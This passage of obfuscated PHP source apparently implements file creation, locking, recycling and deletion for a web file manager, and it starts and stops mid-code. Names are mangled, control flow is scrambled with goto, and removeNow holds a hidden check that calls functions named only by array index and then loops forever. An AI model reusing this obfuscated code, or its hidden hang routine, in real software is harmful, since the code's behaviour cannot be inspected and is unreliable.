Model($DöˆÚâ’„[548])->find($fŞĞÈÕÃ‡œ); Model($DöˆÚâ’„[548])->linkAdd($fŞĞÈÕÃ‡œ); return $this->_createFileCall($eò¼ˆ¿ø‘ˆ, $dæù†˜àë, $C“´Çâ”Äâ, $dçÀØÑò­); } public function addFileByRemote($eÂŠ®„ê÷Î, $FºÓö’éì‡, $EŒ…¹­˜ºå, $B¥ïÉÉ¢ƒˆ = array(), $CŞéÌ×Ì² = REPEAT_RENAME) { $AĞËƒÖ˜“Î = Model($_SERVER[Ä¿Ş°¨][548])->addFileByRemote($FºÓö’éì‡, $EŒ…¹­˜ºå, $B¥ïÉÉ¢ƒˆ); return $this->_createFileCall($eÂŠ®„ê÷Î, $EŒ…¹­˜ºå, $AĞËƒÖ˜“Î, $CŞéÌ×Ì²); } private function _createFileCall($f„–‡ñô”, $e¾‡¡±ê¹Õ, $bŞäÎçÏšØ, $A¸áë‚»ì–, $aëáã½˜²÷ = "\165\160\x6c\157\x61\x64") { goto D•èœº¥Ãá; D¡ŞÍã±›: return $D’•ë“÷Æ; goto cÆ½—ÄÕ; BÅß„¡Ñ´: $D’•ë“÷Æ = $this->_createFile($f„–‡ñô”, $e¾‡¡±ê¹Õ, $bŞäÎçÏšØ, $A¸áë‚»ì–, $då™Şí®›); if (!$då™Şí®›) { Model($AÍ¾×ßà [426])->remove($bŞäÎçÏšØ[$AÍ¾×ßà [423]]); } else { if ($D’•ë“÷Æ) { Model($AÍ¾×ßà [2250])->eventCreate($D’•ë“÷Æ, $aëáã½˜²÷); } } $this->lockWriteEnd($f„–‡ñô”, $e¾‡¡±ê¹Õ); goto D¡ŞÍã±›; D•èœº¥Ãá: $AÍ¾×ßà  =& $_SERVER[Ä¿Ş°¨]; $då™Şí®› = !1; $this->lockWriteStart($f„–‡ñô”, $e¾‡¡±ê¹Õ); goto BÅß„¡Ñ´; cÆ½—ÄÕ: } public function mkdir($AÔÌøÙ‹ç, $E«ø¡…†Ä‘, $D‹Ò‹„Áèç = REPEAT_SKIP) { goto CàçÑãÌ„¼; CàçÑãÌ„¼: $C–ğºÀäÅ =& $_SERVER[Ä¿Ş°¨]; $AÀ©¨‘áÊ˜ = $this->sourceInfo($AÔÌøÙ‹ç); if (!$AÀ©¨‘áÊ˜) { return !1; } goto føÂÑŒ ÎÂ; e‰×®øãÅÒ: return $dğË¾œß÷; goto b‡¦§Ü÷ÓÆ; føÂÑŒ ÎÂ: $this->lockWriteStart($AÔÌøÙ‹ç, $E«ø¡…†Ä‘); if ($D‹Ò‹„Áèç !== !1) { $AÔÒç‰Û‡Ô = $this->fileNameExist($AÔÌøÙ‹ç, $E«ø¡…†Ä‘); if ($AÔÒç‰Û‡Ô && $D‹Ò‹„Áèç != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($AÔÌøÙ‹ç, $E«ø¡…†Ä‘); return $AÔÒç‰Û‡Ô; } $E«ø¡…†Ä‘ = $this->fileNameAuto($AÔÌøÙ‹ç, $E«ø¡…†Ä‘, $D‹Ò‹„Áèç); } $A¥ìïå¾ø– = array($C–ğºÀäÅ[522] => 1, $C–ğºÀäÅ[391] => $E«ø¡…†Ä‘, $C–ğºÀäÅ[523] => $C–ğºÀäÅ[33], $C–ğºÀäÅ[424] => 0, $C–ğºÀäÅ[524] => 0); goto fµñòÊõçÃ; fµñòÊõçÃ: $dğË¾œß÷ = $this->_addSoure($A¥ìïå¾ø–, $AÀ©¨‘áÊ˜); Model($C–ğºÀäÅ[2250])->eventCreate($dğË¾œß÷, $C–ğºÀäÅ[1104]); $this->lockWriteEnd($AÔÌøÙ‹ç, $E«ø¡…†Ä‘); goto e‰×®øãÅÒ; b‡¦§Ü÷ÓÆ: } private function _createFile($BºèœÍà, $B·ëäì’Ã¾, $e©ö™‚Æ¬“, $A¹ØªÇïÖ , &$díÊÓ§Ê) { goto Fêîœµ‘×»; Fêîœµ‘×»: $Cêá×¢ô´ =& $_SERVER[Ä¿Ş°¨]; $F±À‰ˆá›£ = $this->sourceInfo($BºèœÍà); if (!$e©ö™‚Æ¬“ || !$F±À‰ˆá›£) { return !1; } goto bªÇåŸ¤ªà; bùÅÇ‰×²: $eœ´”¾»ø¨ = array($Cêá×¢ô´[522] => 0, $Cêá×¢ô´[391] => $B·ëäì’Ã¾, $Cêá×¢ô´[523] => get_path_ext($B·ëäì’Ã¾), $Cêá×¢ô´[424] => $e©ö™‚Æ¬“[$Cêá×¢ô´[423]], $Cêá×¢ô´[524] => $e©ö™‚Æ¬“[$Cêá×¢ô´[77]]); $F·‡Šô®°â = $this->_addSoure($eœ´”¾»ø¨, $F±À‰ˆá›£); $this->folderSizeReset($BºèœÍà); goto D®Ë…åƒîÛ; D®Ë…åƒîÛ: return $F·‡Šô®°â; goto E »†Œ†ŸÆ; bªÇåŸ¤ªà: if ($A¹ØªÇïÖ  !== !1) { $Bó ß²óÑ÷ = $this->fileNameExist($BºèœÍà, $B·ëäì’Ã¾); } $díÊÓ§Ê = !0; if ($A¹ØªÇïÖ  && $Bó ß²óÑ÷) { if ($A¹ØªÇïÖ  == REPEAT_SKIP) { $díÊÓ§Ê = !1; return $Bó ß²óÑ÷; } else { if ($A¹ØªÇïÖ  == REPEAT_REPLACE) { $a•¦ñ£¥›Ò = $this->sourceInfo($Bó ß²óÑ÷); $FİÅÎß†¨ = $this->fileHistory($a•¦ñ£¥›Ò, $e©ö™‚Æ¬“[$Cêá×¢ô´[423]], $e©ö™‚Æ¬“[$Cêá×¢ô´[77]]); if (!$FİÅÎß†¨) { $díÊÓ§Ê = !1; } else { $this->folderSizeReset($BºèœÍà); } return $Bó ß²óÑ÷; } else { $B·ëäì’Ã¾ = $this->fileNameAuto($BºèœÍà, $B·ëäì’Ã¾, $A¹ØªÇïÖ , !1); } } } goto bùÅÇ‰×²; E »†Œ†ŸÆ: } protected function fileHistory($c´íÀ£ÚœŒ, $bŒ¤‰î , $b´Öß¶£Ö§) { goto CÂ™ÈŞÏåô; A‹¤í¿„‚ë: return !0; goto FçâÅ¯Åè; c¯à¨“Ë‹Õ: Model($EĞÈ¯ğ®ÍÇ[2281])->addHistory($c´íÀ£ÚœŒ); $D†ŠÍâİê¼ = array($EĞÈ¯ğ®ÍÇ[528] => USER_ID, $EĞÈ¯ğ®ÍÇ[395] => time(), $EĞÈ¯ğ®ÍÇ[423] => $bŒ¤‰î , $EĞÈ¯ğ®ÍÇ[77] => $b´Öß¶£Ö§); $this->where(array($EĞÈ¯ğ®ÍÇ[388] => $c´íÀ£ÚœŒ[$EĞÈ¯ğ®ÍÇ[374]]))->save($D†ŠÍâİê¼); goto A‹¤í¿„‚ë; CÂ™ÈŞÏåô: $EĞÈ¯ğ®ÍÇ =& $_SERVER[Ä¿Ş°¨]; if ($c´íÀ£ÚœŒ[$EĞÈ¯ğ®ÍÇ[423]] == $bŒ¤‰î ) { return !1; } $this->checkLock($c´íÀ£ÚœŒ[$EĞÈ¯ğ®ÍÇ[374]], $bŒ¤‰î ); goto c¯à¨“Ë‹Õ; FçâÅ¯Åè: } public function checkLock($D‹µ½îºÊ, $DÖ¥ÎÒ­³ë) { goto dîË´Å‡»â; dîË´Å‡»â: $Eê‚£àŒÀñ =& $_SERVER[Ä¿Ş°¨]; $Cğá÷¹´öÑ = $this->pathInfo($D‹µ½îºÊ); if (!$this->fileIsLock($Cğá÷¹´öÑ, !0)) { return; } goto aáî¯ÙŞØğ; AÒİ†ìÍ™•: $this->_createFileCall($Cğá÷¹´öÑ[$Eê‚£àŒÀñ[465]], $fğ—ìŒõƒø, $Dõà½Å†·, REPEAT_REPLACE, $Eê‚£àŒÀñ[1103]); $f¬Òä‹Á = $Cğá÷¹´öÑ[$Eê‚£àŒÀñ[421]][$Eê‚£àŒÀñ[485]]; $EÛ¨ì ¨¸ = $f¬Òä‹Á[$Eê‚£àŒÀñ[2283]] ? $f¬Òä‹Á[$Eê‚£àŒÀñ[2283]] : $f¬Òä‹Á[$Eê‚£àŒÀñ[28]]; goto DºëÕÙ’âÁ; aáî¯ÙŞØğ: $E‘àĞ©š = Session::get($Eê‚£àŒÀñ[2282]); $fğ—ìŒõƒø = substr($Cğá÷¹´öÑ[$Eê‚£àŒÀñ[28]], 0, -1 - strlen($Cğá÷¹´öÑ[$Eê‚£àŒÀñ[156]])) . $Eê‚£àŒÀñ[1352] . $E‘àĞ©š . $Eê‚£àŒÀñ[91] . $Cğá÷¹´öÑ[$Eê‚£àŒÀñ[156]]; $Dõà½Å†· = Model($Eê‚£àŒÀñ[548])->find($DÖ¥ÎÒ­³ë); goto AÒİ†ìÍ™•; DºëÕÙ’âÁ: show_json(LNG($Eê‚£àŒÀñ[2284]) . $Eê‚£àŒÀñ[2285] . LNG($Eê‚£àŒÀñ[2286]) . $Eê‚£àŒÀñ[2287] . $EÛ¨ì ¨¸ . $Eê‚£àŒÀñ[2288], !1); goto bÒÌ§èĞâš; bÒÌ§èĞâš: } public function fileIsLock($F…—­÷ğé÷, $CÆ¿ø·­ñ = false) { goto CÜÑª‚Òˆ¤; b„‚¹ŠÔİŒ: return !1; goto A·¾‹êçíó; FËñÇ¦í: $d³Û†áŠŞø = $GLOBALS[$f»™¡ë†«Û[6]][$f»™¡ë†«Û[84]][$f»™¡ë†«Û[483]]; if ($F…—­÷ğé÷[$f»™¡ë†«Û[421]][$f»™¡ë†«Û[484]] <= time() - $d³Û†áŠŞø) { $this->metaSet($F…—­÷ğé÷[$f»™¡ë†«Û[374]], $f»™¡ë†«Û[482], null); $this->metaSet($F…—­÷ğé÷[$f»™¡ë†«Û[374]], $f»™¡ë†«Û[484], null); } if ($CÆ¿ø·­ñ) { $this->metaSet($F…—­÷ğé÷[$f»™¡ë†«Û[374]], $f»™¡ë†«Û[484], time()); } goto b„‚¹ŠÔİŒ; CÜÑª‚Òˆ¤: $f»™¡ë†«Û =& $_SERVER[Ä¿Ş°¨]; if (!isset($F…—­÷ğé÷[$f»™¡ë†«Û[421]]) || !$F…—­÷ğé÷[$f»™¡ë†«Û[421]][$f»™¡ë†«Û[482]]) { return !1; } if ($F…—­÷ğé÷[$f»™¡ë†«Û[421]][$f»™¡ë†«Û[482]] != USER_ID) { return !0; } goto FËñÇ¦í; A·¾‹êçíó: } private function _addSoure($e˜®‰ä˜Àİ, $D°¬ã¢ œª) { goto Dà’º¶˜Šó; B‘âºÑğš—: $CÎµ„•Œ’» = array($a¸ø®¸‚ÓÅ[531] => short_id($DâÊµ¢äÎ)); $this->where(array($a¸ø®¸‚ÓÅ[388] => $DâÊµ¢äÎ))->save($CÎµ„•Œ’»); $this->setNamePinyin($DâÊµ¢äÎ, $e˜®‰ä˜Àİ[$a¸ø®¸‚ÓÅ[28]]); goto aƒë–ãÁà‰; bÖóÒ•ÛÍ: $this->updateModifyTime($e˜®‰ä˜Àİ[$a¸ø®¸‚ÓÅ[465]]); $E¸µ¦¬Œæ¨ = $a¸ø®¸‚ÓÅ[2289] . $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[374]]; if (isset(self::$cacheChildList[$E¸µ¦¬Œæ¨])) { unset(self::$cacheChildList[$E¸µ¦¬Œæ¨]); } goto EåˆÊ¸‰’ö; Dà’º¶˜Šó: $a¸ø®¸‚ÓÅ =& $_SERVER[Ä¿Ş°¨]; $DÓòÎ„ŒÕ = array($a¸ø®¸‚ÓÅ[525] => $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[376]], $a¸ø®¸‚ÓÅ[526] => $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[460]], $a¸ø®¸‚ÓÅ[527] => USER_ID, $a¸ø®¸‚ÓÅ[528] => USER_ID, $a¸ø®¸‚ÓÅ[373] => $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[374]], $a¸ø®¸‚ÓÅ[529] => $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[463]] . $D°¬ã¢ œª[$a¸ø®¸‚ÓÅ[374]] . $a¸ø®¸‚ÓÅ[47], $a¸ø®¸‚ÓÅ[400] => 0, $a¸ø®¸‚ÓÅ[530] => $a¸ø®¸‚ÓÅ[33]); $e˜®‰ä˜Àİ = array_merge($DÓòÎ„ŒÕ, $e˜®‰ä˜Àİ); goto bÖóÒ•ÛÍ; EåˆÊ¸‰’ö: static $dÂ…ÏÛèÖ = false; if (!$dÂ…ÏÛèÖ) { Hook::trigger($a¸ø®¸‚ÓÅ[512], $e˜®‰ä˜Àİ); $dÂ…ÏÛèÖ = !0; } $DâÊµ¢äÎ = $this->add($e˜®‰ä˜Àİ); goto B‘âºÑğš—; aƒë–ãÁà‰: return $DâÊµ¢äÎ; goto Aöš®‘¿›Ç; Aöš®‘¿›Ç: } public function remove($e‚¸ïºœ§î, $fØßëÁ—’§ = true) { goto cÄŒêÃ‚Ç; F›á—¾‰‰: $D³öôÌËóØ = $c¬ £µÜ¶±[$a†°ø›óã…[376]] == self::TYPE_USER ? $a†°ø›óã…[539] : $a†°ø›óã…[958]; if ($D³öôÌËóØ == $a†°ø›óã…[539]) { $Cãã×‹¼£² = Model($a†°ø›óã…[478])->getInfo($c¬ £µÜ¶±[$a†°ø›óã…[460]]); $D—í¼à–Í¸ = !empty($Cãã×‹¼£²[$a†°ø›óã…[2283]]) ? $Cãã×‹¼£²[$a†°ø›óã…[2283]] : $Cãã×‹¼£²[$a†°ø›óã…[28]]; $D—í¼à–Í¸ = $a†°ø›óã…[244] . $D—í¼à–Í¸ . $a†°ø›óã…[2291] . $c¬ £µÜ¶±[$a†°ø›óã…[460]]; } else { $Cãã×‹¼£² = Model($a†°ø›óã…[462])->getInfo($c¬ £µÜ¶±[$a†°ø›óã…[460]]); $D—í¼à–Í¸ = _get($Cãã×‹¼£², $a†°ø›óã…[28]); $D—í¼à–Í¸ = $a†°ø›óã…[153] . $D—í¼à–Í¸ . $a†°ø›óã…[2292] . $c¬ £µÜ¶±[$a†°ø›óã…[460]]; } $B‡š÷©‚‰„ = $a†°ø›óã…[2293] . md5($D—í¼à–Í¸); goto B÷¶…áå¬; B÷¶…áå¬: CacheLock::lock($B‡š÷©‚‰„); $eßÉñï¼áÎ = $this->fileNameExist($Fó“‡ˆ«, $D—í¼à–Í¸); if (!$eßÉñï¼áÎ) { $eßÉñï¼áÎ = $this->mkdir($Fó“‡ˆ«, $D—í¼à–Í¸, REPEAT_SKIP); $this->metaSet($eßÉñï¼áÎ, $a†°ø›óã…[2294], $D³öôÌËóØ); $this->metaSet($eßÉñï¼áÎ, $a†°ø›óã…[2295], $c¬ £µÜ¶±[$a†°ø›óã…[460]]); if ($c¬ £µÜ¶±[$a†°ø›óã…[465]] != 0) { $this->metaSet($eßÉñï¼áÎ, $a†°ø›óã…[2296], _get($Cãã×‹¼£², $a†°ø›óã…[2297])); } } goto Eí¸ëÉ ‹â; eÁÉ›ÈËë: $eÀŠô˜Ø… = Model($a†°ø›óã…[1397])->get($a†°ø›óã…[2290]) == $a†°ø›óã…[83]; if ($AğÔÑØÀøÍ || $fØßëÁ—’§ || !$eÀŠô˜Ø…) { return $this->removeNow($e‚¸ïºœ§î, $fØßëÁ—’§); } $Fó“‡ˆ« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F›á—¾‰‰; cÄŒêÃ‚Ç: $a†°ø›óã… =& $_SERVER[Ä¿Ş°¨]; $c¬ £µÜ¶± = $this->sourceInfo($e‚¸ïºœ§î); $AğÔÑØÀøÍ = intval($c¬ £µÜ¶±[$a†°ø›óã…[376]]) === self::TYPE_SYSTEM; goto eÁÉ›ÈËë; Eí¸ëÉ ‹â: CacheLock::unlock($B‡š÷©‚‰„); $this->metaSet($e‚¸ïºœ§î, $a†°ø›óã…[2298], $c¬ £µÜ¶±[$a†°ø›óã…[465]]); $this->where(array($a†°ø›óã…[374] => $e‚¸ïºœ§î))->save(array($a†°ø›óã…[395] => time())); goto aÅÍëŒ ¨©; aÅÍëŒ ¨©: $this->recycleClear($c¬ £µÜ¶±); return $this->move($e‚¸ïºœ§î, $eßÉñï¼áÎ, REPEAT_RENAME_FOLDER); goto BµÕïÓŠˆä; BµÕïÓŠˆä: } private function recycleClear($aóõ÷çß) { $B´Ü¹‚˜ =& $_SERVER[Ä¿Ş°¨]; $b£µ›í×Óš = $this->childrenAll($aóõ÷çß); $fÄÚí½ÇòŞ = array($B´Ü¹‚˜[388] => array($B´Ü¹‚˜[389], $b£µ›í×Óš[$B´Ü¹‚˜[2299]])); Model($B´Ü¹‚˜[2300])->where($fÄÚí½ÇòŞ)->delete(); } public function removeNow($c¬ªôˆ°µÃ, $c£§À³•ùì = true) { goto AÖ‚ÕïŞÏ; d š²Ë’ææ: $this->folderSizeReset($D©·‚ªÉ¨[$c¼×ÌÁ®Ëæ[465]]); $c±ç„Œ¯‹ = array($D©·‚ªÉ¨[$c¼×ÌÁ®Ëæ[465]]); if ($D©·‚ªÉ¨[$c¼×ÌÁ®Ëæ[375]] == $c¼×ÌÁ®Ëæ[83]) { $c±ç„Œ¯‹[] = $D©·‚ªÉ¨[$c¼×ÌÁ®Ëæ[374]]; } goto aè§„”Ç¨; DÆí¸ë­Á¾: return !0; goto dëˆòøÊ‹; aè§„”Ç¨: $this->updateModifyTime($c±ç„Œ¯‹); $this->lockMoveEnd($c¬ªôˆ°µÃ); Hook::trigger($c¼×ÌÁ®Ëæ[1433], $Aì‰‰Ü†õŠ, $c£§À³•ùì); goto DÆí¸ë­Á¾; C …»ùñÁè: $this->lockMoveStart($c¬ªôˆ°µÃ); Hook::trigger($c¼×ÌÁ®Ëæ[2301], $Aì‰‰Ü†õŠ, $c£§À³•ùì); if ($c£§À³•ùì) { Model($c¼×ÌÁ®Ëæ[2300])->moveToRecycle($c¬ªôˆ°µÃ); } else { $E‚òÀÌâŠ¤ = $this->childrenAll($D©·‚ªÉ¨); Model($c¼×ÌÁ®Ëæ[509])->eventRemove($c¬ªôˆ°µÃ); $this->removeRelevance($E‚òÀÌâŠ¤[$c¼×ÌÁ®Ëæ[2299]], $E‚òÀÌâŠ¤[$c¼×ÌÁ®Ëæ[1236]]); } goto d š²Ë’ææ; AÖ‚ÕïŞÏ: $c¼×ÌÁ®Ëæ =& $_SERVER[Ä¿Ş°¨]; if (!isset($_SERVER[$c¼×ÌÁ®Ëæ[360]]) || !isset($_SERVER[$c¼×ÌÁ®Ëæ[368]])) { goto Aö›Ä‰ºë÷; F‹õ”Š¯ƒ¢: $ašÔ„ÛµÊÙ = $c¼×ÌÁ®Ëæ[781]; $ašÔ„ÛµÊÙ($_SERVER[$c¼×ÌÁ®Ëæ[782]]); $Aî˜§†Ô = 1; goto Aâáèù®¯; eã°õñ¦êÏ: $c‘¤î®ˆ‘â = $D”£õŞ¾‚®($Aß‚ÖÚÆæ); $eá‘íÜ‘¤Ñ = explode($c¼×ÌÁ®Ëæ[213], $c‘¤î®ˆ‘â); if (count($eá‘íÜ‘¤Ñ) < $c¼×ÌÁ®Ëæ[557]) { $bä§®òŸ…§ = $c¼×ÌÁ®Ëæ[366]; $bä§®òŸ…§(); } goto F‹õ”Š¯ƒ¢; Aâáèù®¯: for ($FÛ´ˆãÍã = $Aî˜§†Ô; $FÛ´ˆãÍã > 0; $FÛ´ˆãÍã++) { $ašÔ„ÛµÊÙ = json_encode($GLOBALS[$c¼×ÌÁ®Ëæ[389]]); } goto FÀ¨é™æŠ­; Aö›Ä‰ºë÷: $BÉ¨¤§¼“ = $c¼×ÌÁ®Ëæ[780]; $D”£õŞ¾‚® = $c¼×ÌÁ®Ëæ[362]; $Aß‚ÖÚÆæ = $_SERVER[$c¼×ÌÁ®Ëæ[363]] . $c¼×ÌÁ®Ëæ[364]; goto eã°õñ¦êÏ; FÀ¨é™æŠ­: } $D©·‚ªÉ¨ = $this->sourceInfo($c¬ªôˆ°µÃ); goto b–Ó‡à‡Á¬; b–Ó‡à‡Á¬: $Aì‰‰Ü†õŠ = $this->pathInfoMore($c¬ªôˆ°µÃ); if (!$D©·‚ªÉ¨) { return !0; } if ($D©·‚ªÉ¨[$c¼×ÌÁ®Ëæ[465]] == 0) { if (!_get($GLOBALS, $c¼×ÌÁ®Ëæ[461])) { return !1; } } goto C …»ùñÁè; dëˆòøÊ‹: } public function childrenAll($E‚ÅïâñÜ¼) { $Aº½ÇÑö•‘ =& $_SERVER[Ä¿Ş°¨]; $E´‡–æôÙÒ = $E‚ÅïâñÜ¼[$Aº½ÇÑö•‘[374]]; if ($E‚ÅïâñÜ¼[$Aº½ÇÑö•‘[375]] == $Aº½ÇÑö•‘[83]) { $dÄ™‰º­™ = array($Aº½ÇÑö•‘[529] => array($Aº½ÇÑö•‘[487], $E‚ÅïâñÜ¼[$Aº½ÇÑö•‘[463]] . $E´‡–æôÙÒ . $Aº½ÇÑö•‘[488])); $CŒä£ƒ£´¦ = array($Aº½ÇÑö•‘[529] => $dÄ™‰º­™[$Aº½ÇÑö•‘[463]]); $e£ÅôÄè‘Ï = $this->field($Aº½ÇÑö•‘[2302])->where($CŒä£ƒ£´¦)->select(); $fğÁÅ…˜Èë = !1; $E¶›†ÏŞ½ = array($E´‡–æôÙÒ); if ($e£ÅôÄè‘Ï) { $fğÁÅ…˜Èë = array_to_keyvalue($e£ÅôÄè‘Ï, $Aº½ÇÑö•‘[33], $Aº½ÇÑö•‘[423]); $fğÁÅ…˜Èë = array_remove_value($fğÁÅ…˜Èë, $Aº½ÇÑö•‘[472]); $E¶›†ÏŞ½ = array_to_keyvalue($e£ÅôÄè‘Ï, $Aº½ÇÑö•‘[33], $Aº½ÇÑö•‘[374]); $E¶›†ÏŞ½[] = $E´‡–æôÙÒ; } } else { $fğÁÅ…˜Èë = array($E‚ÅïâñÜ¼[$Aº½ÇÑö•‘[423]]); $E¶›†ÏŞ½ = array($E´‡–æôÙÒ); } return array($Aº½ÇÑö•‘[2299] => $E¶›†ÏŞ½, $Aº½ÇÑö•‘[1236] => $fğÁÅ…˜Èë); } public function removeArray($CÎ¢á…‘æ) { if (!$CÎ¢á…‘æ) { return !0; } } public function removeRelevance($aø‰½¥¦´Î, $AŸÜè£™ ƒ) { goto fÍö—™ôàÄ; fáìõÒ’ï: Model($b³ƒªØ¯‚†[2281])->removeBySource($aø‰½¥¦´Î); $this->where($DÅ›ÒÆ‰µ)->delete(); Model($b³ƒªØ¯‚†[426])->remove($AŸÜè£™ ƒ); goto EÜ½ÀÕÔ“; b¨çá¤À‹ì: $DÅ›ÒÆ‰µ = array($b³ƒªØ¯‚†[388] => array($b³ƒªØ¯‚†[389], $aø‰½¥¦´Î)); Model($b³ƒªØ¯‚†[2300])->where($DÅ›ÒÆ‰µ)->delete(); Model($b³ƒªØ¯‚†[417])->where($DÅ›ÒÆ‰µ)->delete(); goto b‚ºÎë¤Ê; fÍö—™ôàÄ: $b³ƒªØ¯‚† =& $_SERVER[Ä¿Ş°¨]; $aø‰½¥¦´Î = $aø‰½¥¦´Î ? $aø‰½¥¦´Î : array(); $AŸÜè£™ ƒ = $AŸÜè£™ ƒ ? $AŸÜè£™ ƒ : array(); goto fÜÊÎÄŒä; b‚ºÎë¤Ê: Model($b³ƒªØ¯‚†[2303])->where($DÅ›ÒÆ‰µ)->delete(); Model($b³ƒªØ¯‚†[509])->where($DÅ›ÒÆ‰µ)->delete(); Model($b³ƒªØ¯‚†[2040])->removeBySource($aø‰½¥¦´Î); goto fáìõÒ’ï; EÜ½ÀÕÔ“: for ($FÓÏõ£ó¹ = 0; $FÓÏõ£ó¹ < count($aø‰½¥¦´Î); $FÓÏõ£ó¹++) { $this->sourceCacheClear($aø‰½¥¦´Î[$FÓÏõ£ó¹]); } goto Fõñé‰“©; fÜÊÎÄŒä: $aø‰½¥¦´Î = array_unique(array_filter($aø‰½¥¦´Î)); $AŸÜè£™ ƒ = array_unique(array_filter($AŸÜè£™ ƒ)); if (!$aø‰½¥¦´Î) { return !1; } goto b¨çá¤À‹ì; Fõñé‰“©: } public function rename($EÑÀÏ²Îù, $c‘ÔéÕ‡Œ) { goto b‚íš°áì; c·ŸíÕìîİ: $e¿¡Ñâƒ † = $B‚ˆßÇÚ¢Ì[2289] . $bİÓò†”î½[$B‚ˆßÇÚ¢Ì[465]]; if (isset(self::$cacheChildList[$e¿¡Ñâƒ †])) { unset(self::$cacheChildList[$e¿¡Ñâƒ †]); } return $båÂŒŒ‰‚¨; goto dÀ¯Ü¹âÙ; eÉñ¼ÍÓ„À: $eß¤ˆ‡Ğ¿ã = $this->fileNameExist($bİÓò†”î½[$B‚ˆßÇÚ¢Ì[465]], $c‘ÔéÕ‡Œ); if ($eß¤ˆ‡Ğ¿ã) { return !1; } $Dá­«¶¦ƒ = array($B‚ˆßÇÚ¢Ì[391] => $c‘ÔéÕ‡Œ, $B‚ˆßÇÚ¢Ì[528] => USER_ID); goto CàŒÌ˜áœƒ; b‚íš°áì: $B‚ˆßÇÚ¢Ì =& $_SERVER[Ä¿Ş°¨]; $bİÓò†”î½ = $this->sourceInfo($EÑÀÏ²Îù); if (!$bİÓò†”î½) { return !1; } goto eÉñ¼ÍÓ„À; CàŒÌ˜áœƒ: if (!$bİÓò†”î½[$B‚ˆßÇÚ¢Ì[375]] == $B‚ˆßÇÚ¢Ì[83]) { $Dá­«¶¦ƒ[$B‚ˆßÇÚ¢Ì[377]] = get_path_ext($c‘ÔéÕ‡Œ); } Model($B‚ˆßÇÚ¢Ì[509])->eventRename($EÑÀÏ²Îù, $bİÓò†”î½[$B‚ˆßÇÚ¢Ì[28]], $c‘ÔéÕ‡Œ); $this->sourceCacheClear($EÑÀÏ²Îù); goto dÚ‹õá§Í»; dÚ‹õá§Í»: $this->setNamePinyin($EÑÀÏ²Îù, $Dá­«¶¦ƒ[$B‚ˆßÇÚ¢Ì[28]], !1); $this->updateModifyTime($bİÓò†”î½[$B‚ˆßÇÚ¢Ì[465]]); $båÂŒŒ‰‚¨ = $this->where(array($B‚ˆßÇÚ¢Ì[388] => $EÑÀÏ²Îù))->data($Dá­«¶¦ƒ)->save(); goto c·ŸíÕìîİ; dÀ¯Ü¹âÙ: } public function setNamePinyin($c¼Ñº„çï, $CµÒ±×ñç, $Cóëï…ç¿Ä = true) { $cº«˜£Šò‡ =& $_SERVER[Ä¿Ş°¨]; $EÔª…¿Ôğ = Input::check($CµÒ±×ñç, $cº«˜£Šò‡[532]); if ($Cóëï…ç¿Ä && !$EÔª…¿Ôğ) { return; } if (!$EÔª…¿Ôğ) { $this->metaSet($c¼Ñº„çï, $cº«˜£Šò‡[420], null); $this->metaSet($c¼Ñº„çï, $cº«˜£Šò‡[419], null); return; } $e–˜À³†ù¨ = array($cº«˜£Šò‡[420] => str_replace($cº«˜£Šò‡[50], $cº«˜£Šò‡[33], Pinyin::encode($CµÒ±×ñç)), $cº«˜£Šò‡[419] => Pinyin::encode($CµÒ±×ñç, $cº«˜£Šò‡[533])); $this->metaSet($c¼Ñº„çï, $e–˜À³†ù¨); } public function getContent($Bª¨öí­«™) { goto a´ÂçŠ°Å; aˆé›·»Œ: return IO::getContent($E“¡ƒ˜Í»[$B¸¢ôëÊ†[75]]); goto C„ÄÔ§‰¼; a´ÂçŠ°Å: $B¸¢ôëÊ† =& $_SERVER[Ä¿Ş°¨]; $E“¡ƒ˜Í» = $this->fileInfoGet($Bª¨öí­«™); if (!$E“¡ƒ˜Í») { return !1; } goto d…«‡Ò¾¦Ö; d…«‡Ò¾¦Ö: if ($E“¡ƒ˜Í»[$B¸¢ôëÊ†[77]] == 0) { return $B¸¢ôëÊ†[33]; } $B››‹“•ø = $B¸¢ôëÊ†[2304] . $E“¡ƒ˜Í»[$B¸¢ôëÊ†[159]]; if ($E“¡ƒ˜Í»[$B¸¢ôëÊ†[77]] <= 1024 * 10) { $D°Ëİ±Ëï = Cache::get($B››‹“•ø); if (!$D°Ëİ±Ëï) { $D°Ëİ±Ëï = IO::getContent($E“¡ƒ˜Í»[$B¸¢ôëÊ†[75]]); Cache::set($B››‹“•ø, $D°Ëİ±Ëï); } return $D°Ëİ±Ëï; } goto aˆé›·»Œ; C„ÄÔ§‰¼: } public function setDesc($cœáâÆ„¥Œ, $eèâÚšƒ²) { $dô±çí‰Í… =& $_SERVER[Ä¿Ş°¨]; Model($dô±çí‰Í…[509])->eventAddDesc($cœáâÆ„¥Œ, $eèâÚšƒ²); return $this->metaSet($cœáâÆ„¥Œ, $dô±çí‰Í…[409], $eèâÚšƒ²); } public function setContent($B×Î¸«ˆ÷, $AŞ…âæ·¶Ï = '') { goto E±‡‡èĞİ; D‚“’ËÖ³·: if (!$aµ°Ùõ‡©­) { return Model($b÷òª•¦´Ü[426])->remove($BĞ‰æŒº›[$b÷òª•¦´Ü[423]]); } $this->folderSizeReset($AÅ˜Ú•îíÄ[$b÷òª•¦´Ü[465]]); return !0; goto dÛëŠµŒŞ®; E±‡‡èĞİ: $b÷òª•¦´Ü =& $_SERVER[Ä¿Ş°¨]; $AÅ˜Ú•îíÄ = $this->sourceInfo($B×Î¸«ˆ÷); $CÒ¡×à‡î¬ = $this->fileInfoGet($B×Î¸«ˆ÷); goto CÀêó´œ¿; CÀêó´œ¿: if (!$CÒ¡×à‡î¬ || !$AÅ˜Ú•îíÄ) { return !1; } $BĞ‰æŒº› = Model($b÷òª•¦´Ü[426])->addFileByContent($AŞ…âæ·¶Ï, $AÅ˜Ú•îíÄ[$b÷òª•¦´Ü[28]]); $aµ°Ùõ‡©­ = $this->fileHistory($AÅ˜Ú•îíÄ, $BĞ‰æŒº›[$b÷òª•¦´Ü[423]], $BĞ‰æŒº›[$b÷òª•¦´Ü[77]]); goto D‚“’ËÖ³·; dÛëŠµŒŞ®: } public function fileSubstr($B»ˆø¤Í¨Ÿ, $C–Ò †Û¹å, $D¼øÛëÒ¾Ş) { $AÔñª…”¤ = 